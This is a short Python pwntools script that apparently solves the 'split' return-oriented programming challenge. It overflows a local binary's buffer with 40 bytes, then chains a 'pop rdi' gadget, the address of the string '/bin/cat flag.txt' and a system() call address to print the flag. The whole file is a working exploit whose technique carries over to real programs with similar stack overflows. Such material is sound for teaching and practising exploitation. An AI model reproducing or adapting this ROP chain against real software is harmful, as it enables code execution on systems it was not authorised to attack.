from pwn import * 

elf=ELF("split")
r=ROP([elf])
p=process(elf.path)

ret = r.find_gadget(["ret"])[0]
pop_rdi=r.find_gadget(["pop rdi","ret"])[0]
bin_cat_addr=next(elf.search(b'/bin/cat flag.txt\00'))
#address where system 
system_call=p64(0x0040074b)

print(bin_cat_addr)
print(pop_rdi)

p.recvuntil(b'>')
payload=b'A'*40
payload+=p64(pop_rdi)+p64(bin_cat_addr)
payload+=system_call
payload+=p64(ret)
p.send(payload)

print(p.recvuntil(b'}'))



